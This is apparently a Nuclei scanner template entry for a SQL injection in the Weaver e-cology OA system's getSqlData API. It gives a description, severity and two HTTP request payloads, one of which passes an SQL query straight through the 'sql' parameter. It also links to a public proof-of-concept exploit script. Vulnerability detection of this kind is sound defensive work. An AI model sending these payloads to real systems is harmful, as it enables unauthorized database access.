# Nuclei Template: Weaver E-Cology `getsqldata` - SQL Injection
**Template ID:** weaver-ecology-getsqldata-sqli
**Vulnerability Class:** SQL Injection
**Severity:** High
**CWE:** CWE-89
**Source:** Nuclei Template (`weaver-ecology-getsqldata-sqli.yaml`)

## Vulnerability Information & PoC

## Description
When the getSqlData interface of the Panwei e-cology OA system uses the mssql database, the built-in SQL statements are not spliced strictly, resulting in a SQL injection vulnerability.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/Api/portal/elementEcodeAddon/getSqlData?sql=select%20substring(sys.fn_sqlvarbasetostr(hashbytes('MD5','{{num}}')),3,32)
GET {{BaseURL}}/Api/portal/elementEcodeAddon/getSqlData?sql=
```

## References
- https://github.com/Wrin9/weaverOA_sql_RCE/blob/14cca7a6da7a4a81e7c7a7016cb0da75b8b290bc/weaverOA_sql_injection_POC_EXP.py#L46
